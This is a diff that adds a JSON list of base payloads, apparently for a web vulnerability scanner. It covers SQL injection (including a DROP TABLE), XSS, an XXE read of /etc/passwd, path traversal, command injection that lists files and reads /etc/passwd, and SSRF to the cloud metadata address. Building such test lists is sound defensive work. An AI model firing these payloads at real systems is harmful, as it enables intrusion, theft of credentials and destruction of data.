@@ -1,0 +1,54 @@
+[
+  {
+    "name": "SQL Injection",
+    "base_payloads": [
+      "' OR '1'='1",
+      "\" OR \"1\"=\"1",
+      "' OR 1=1--",
+      "'; DROP TABLE users; --"
+    ],
+    "description": "Tests designed to simulate SQL injection attempts."
+  },
+  {
+    "name": "XSS",
+    "base_payloads": [
+      "<script>alert('XSS')</script>",
+      "\"/><script>alert('XSS')</script>",
+      "<IMG SRC=javascript:alert('XSS')>"
+    ],
+    "description": "Tests to check for Cross-Site Scripting vulnerabilities."
+  },
+  {
+    "name": "XXE",
+    "base_payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    ],
+    "description": "Tests for XML External Entity (XXE) vulnerabilities."
+  },
+  {
+    "name": "Local File Inclusion (LFI)",
+    "base_payloads": [
+      "../../../../etc/passwd",
+      "../../etc/passwd"
+    ],
+    "description": "Tests for Local File Inclusion vulnerabilities."
+  },
+  {
+    "name": "Command Injection",
+    "base_payloads": [
+      "; ls -la",
+      "&& cat /etc/passwd",
+      "| id"
+    ],
+    "description": "Tests designed to inject OS commands."
+  },
+  {
+    "name": "SSRF",
+    "base_payloads": [
+      "http://127.0.0.1:22",
+      "http://localhost:80",
+      "http://169.254.169.254/latest/meta-data/"
+    ],
+    "description": "Tests for Server-Side Request Forgery vulnerabilities."
+  }
+]
